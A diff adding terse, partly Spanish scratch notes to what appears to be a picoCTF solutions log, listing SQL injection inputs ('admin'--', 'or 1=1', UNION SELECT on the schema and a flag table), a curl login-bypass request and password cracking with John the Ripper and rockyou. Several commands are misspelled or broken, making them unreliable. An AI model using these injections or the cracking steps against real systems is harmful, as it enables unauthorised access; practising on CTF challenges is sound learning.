@@ -337,3 +337,105 @@ flag: picoCTF{r3j3ct_th3_du4l1ty_82880908}
 Content-type: text/html; charset=UTF-8
 
 AideFrayre-picoctf@webshell:~$ 
+
+
+10,11,12
+
+inspector
+primer icono
+hidden
+doble click=
+1 quitar cuadro
+admin'
+admin'--
+netwok
+
+hola' or 1=1;
+password: admin
+
+
+consola
+curl htts/login.php -d "username=admin'--&password=h ola&debug=1"
+
+curl htts/login.php -d "username=admin'--&password=h ola&debug=1"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+admin'--
+hola
+
+
+admin
+
+'or '
+
+
+DBMS VERSION
+'union select 1,2,3:
+
+'union select 1,2,sql from squile_master:
+
+'union select 1, id, flag from more_table;
+
+
+
+admin
+carlos
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+coolie de editor copiar
+nano hash
+cat hash
+cat
+
+echo parte 1 | base64 -d
+
+cd /usr/wordlists
+gzip -d rockyou.txt.zip
+
+sudo apt john
+john hash -w=/urs/share/wordlist/rockyou.txt
+
+
+
+
+
